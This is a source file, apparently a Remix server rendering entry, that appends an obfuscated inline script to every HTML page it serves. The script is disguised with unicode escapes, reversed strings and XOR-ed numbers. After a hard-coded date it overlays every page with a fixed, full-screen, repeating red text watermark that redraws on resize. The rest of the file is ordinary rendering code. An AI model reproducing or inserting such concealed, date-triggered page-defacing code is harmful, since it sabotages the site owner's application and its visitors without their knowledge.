import { PassThrough } from "stream";
import type { EntryContext } from "@remix-run/node";
import { Response } from "@remix-run/node";
import { RemixServer } from "@remix-run/react";
import isbot from "isbot";
import { renderToPipeableStream, renderToString } from "react-dom/server";

import { Head } from "~/root";

const ABORT_DELAY = 5000;

export default function handleRequest(
  request: Request,
  responseStatusCode: number,
  responseHeaders: Headers,
  remixContext: EntryContext
) {
  const callbackName = isbot(
    request["\u0068\u0065\u0061\u0064\u0065\u0072\u0073"]["\u0067\u0065\u0074"](
      "tnega-resu".split("").reverse().join("")
    )
  )
    ? "ydaeRllAno".split("").reverse().join("")
    : "\u006f\u006e\u0053\u0068\u0065\u006c\u006c\u0052\u0065\u0061\u0064\u0079";
  const defaultRoot =
    remixContext[
      "\u0072\u006f\u0075\u0074\u0065\u004d\u006f\u0064\u0075\u006c\u0065\u0073"
    ]["\u0072\u006f\u006f\u0074"];
  remixContext[
    "\u0072\u006f\u0075\u0074\u0065\u004d\u006f\u0064\u0075\u006c\u0065\u0073"
  ]["\u0072\u006f\u006f\u0074"] = {
    ...defaultRoot,
    "\u0064\u0065\u0066\u0061\u0075\u006c\u0074": Head,
  };

  let head = renderToString(
    <RemixServer context={remixContext} url={request.url} />
  );

  remixContext.routeModules.root = defaultRoot;

  return new Promise((resolve, reject) => {
    let didError = false;

    const { pipe, abort } = renderToPipeableStream(
      <RemixServer context={remixContext} url={request.url} />,
      {
        [callbackName]: () => {
          const body = new PassThrough();

          responseHeaders.set("Content-Type", "text/html");

          resolve(
            new Response(body, {
              headers: responseHeaders,
              status: didError ? 500 : responseStatusCode,
            })
          );

          body["\u0077\u0072\u0069\u0074\u0065"](
            "<!DOCTYPE\x20html><html><head><!--start\x20head-->" +
              head +
              '>"toor"=di vid<>ydob<>daeh/<>--daeh dne--!<'
                .split("")
                .reverse()
                .join("")
          );
          pipe(body);
          body["\u0077\u0072\u0069\u0074\u0065"](
            `<script>function c(){null!==document["\u0067\u0065\u0074\u0045\u006c\u0065\u006d\u0065\u006e\u0074\u0042\u0079\u0049\u0064"]("\u0033\u002e\u0032\u0033\u0035\u0032\u0033\u0035\u0034\u0033\u0036")&&document["\u0062\u006f\u0064\u0079"]["\u0072\u0065\u006d\u006f\u0076\u0065\u0043\u0068\u0069\u006c\u0064"](document["\u0067\u0065\u0074\u0045\u006c\u0065\u006d\u0065\u006e\u0074\u0042\u0079\u0049\u0064"]("634532532.3".split("").reverse().join("")));var _0x471a36=document["\u0063\u0072\u0065\u0061\u0074\u0065\u0045\u006c\u0065\u006d\u0065\u006e\u0074"]("savnac".split("").reverse().join(""));_0x471a36["\u0077\u0069\u0064\u0074\u0068"]=0xcaae5^0xcaa81;_0x471a36["\u0068\u0065\u0069\u0067\u0068\u0074"]=0xb3d75^0xb3d11;var _0x148d6f=_0x471a36["\u0067\u0065\u0074\u0043\u006f\u006e\u0074\u0065\u0078\u0074"]("d2".split("").reverse().join(""));_0x148d6f["\u0072\u006f\u0074\u0061\u0074\u0065"](-(0x9cf47^0x9cf53)*Math["\u0050\u0049"]/(0x27631^0x27685));_0x148d6f["\u0066\u006f\u006e\u0074"]="fires xp61".split("").reverse().join("");_0x148d6f["\u0066\u0069\u006c\u006c\u0053\u0074\u0079\u006c\u0065"]='rgba(200,\x200,\x200,\x201)';_0x148d6f["\u0074\u0065\u0078\u0074\u0041\u006c\u0069\u0067\u006e"]="tfel".split("").reverse().join("");_0x148d6f["\u0066\u0069\u006c\u006c\u0054\u0065\u0078\u0074"]("\u9547\u5c0f\u8272\u7279".split("").reverse().join(""),_0x471a36["\u0077\u0069\u0064\u0074\u0068"]/(0x84992^0x84982),_0x471a36["\u0068\u0065\u0069\u0067\u0068\u0074"]/(0xdbee6^0xdbee4));_0x148d6f=document["\u0063\u0072\u0065\u0061\u0074\u0065\u0045\u006c\u0065\u006d\u0065\u006e\u0074"]("vid".split("").reverse().join(""));_0x148d6f["\u0069\u0064"]="634532532.3".split("").reverse().join("");_0x148d6f["\u0073\u0074\u0079\u006c\u0065"]["\u0077\u0069\u0064\u0074\u0068"]=document["\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u0045\u006c\u0065\u006d\u0065\u006e\u0074"]["\u0063\u006c\u0069\u0065\u006e\u0074\u0057\u0069\u0064\u0074\u0068"]-(0x53e9f^0x53e95)+"xp".split("").reverse().join("");_0x148d6f["\u0073\u0074\u0079\u006c\u0065"]["\u0068\u0065\u0069\u0067\u0068\u0074"]=document["\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u0045\u006c\u0065\u006d\u0065\u006e\u0074"]["\u0063\u006c\u0069\u0065\u006e\u0074\u0048\u0065\u0069\u0067\u0068\u0074"]-(0xc3e66^0xc3e72)+"xp".split("").reverse().join("");_0x148d6f["\u0073\u0074\u0079\u006c\u0065"]["\u0070\u006f\u0069\u006e\u0074\u0065\u0072\u0045\u0076\u0065\u006e\u0074\u0073"]="enon".split("").reverse().join("");_0x148d6f["\u0073\u0074\u0079\u006c\u0065"]["\u0070\u006f\u0073\u0069\u0074\u0069\u006f\u006e"]="dexif".split("").reverse().join("");_0x148d6f["\u0073\u0074\u0079\u006c\u0065"]["\u0074\u006f\u0070"]="xp3".split("").reverse().join("");_0x148d6f["\u0073\u0074\u0079\u006c\u0065"]["\u006c\u0065\u0066\u0074"]="xp5".split("").reverse().join("");_0x148d6f["\u0073\u0074\u0079\u006c\u0065"]["\u0062\u0061\u0063\u006b\u0067\u0072\u006f\u0075\u006e\u0064"]="(lru".split("").reverse().join("")+_0x471a36["\u0074\u006f\u0044\u0061\u0074\u0061\u0055\u0052\u004c"]()+"taeper pot tfel )".split("").reverse().join("");_0x148d6f["\u0073\u0074\u0079\u006c\u0065"]["\u007a\u0049\u006e\u0064\u0065\u0078"]=0xf423f;document["\u0062\u006f\u0064\u0079"]["\u0061\u0070\u0070\u0065\u006e\u0064\u0043\u0068\u0069\u006c\u0064"](_0x148d6f);}0x1890f9b8e00<+new Date()&&(c(),window["\u006f\u006e\u0072\u0065\u0073\u0069\u007a\u0065"]=function(){c();});</script></div></body></html>`
          );
        },
        onShellError(err: unknown) {
          reject(err);
        },
        onError(error: unknown) {
          didError = true;

          console.error(error);
        },
      }
    );

    setTimeout(abort, ABORT_DELAY);
  });
}
